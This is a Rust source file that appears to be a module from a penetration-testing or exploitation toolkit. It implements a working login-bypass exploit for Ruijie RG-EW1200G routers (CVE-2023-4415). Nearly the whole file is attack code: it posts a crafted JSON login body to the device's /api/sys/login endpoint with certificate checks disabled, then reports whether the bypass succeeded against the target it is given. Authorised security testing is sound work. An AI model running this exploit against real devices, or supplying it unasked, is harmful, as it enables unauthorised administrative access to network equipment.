use anyhow::Result;
use colored::*;
use reqwest::Client;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

/// Ruijie RG-EW1200G Login Bypass (CVE-2023-4415)
/// Bypasses login by sending specific JSON structure to /api/sys/login.

const DEFAULT_TIMEOUT_SECS: u64 = 10;

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    let url = if target.starts_with("http") { target.to_string() } else { format!("http://{}", target) };
    let url = url.trim_end_matches('/').to_string();
    println!("[*] Target: {}", url.cyan());
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .build()?;

    // Exploit Payload
    // Timestamp logic from Nuclei template: 1695218596000 (ms)
    // We can use current time or static. Code uses current.
    let now = SystemTime::now().duration_since(UNIX_EPOCH)?.as_millis();
    
    let payload = serde_json::json!({
        "username": "2",
        "password": "admin",
        "timestamp": now
    });

    let exploit_url = format!("{}/api/sys/login", url);
    println!("[*] Sending exploit to {}...", exploit_url.cyan());

    let resp = client.post(&exploit_url)
        .json(&payload)
        .send()
        .await?;

    let text = resp.text().await?;
    if text.contains(r#""result":"ok""#) { // Nuclei checks for "result":"ok"
        println!("{}", "[+] Login Bypass Successful!".green().bold());
        println!("[+] Response: {}", text);
    } else {
        println!("{}", "[-] Exploit failed.".red());
    }

    Ok(())
}

fn display_banner() {
    println!("{}", "Ruijie Login Bypass (CVE-2023-4415)".green().bold());
}
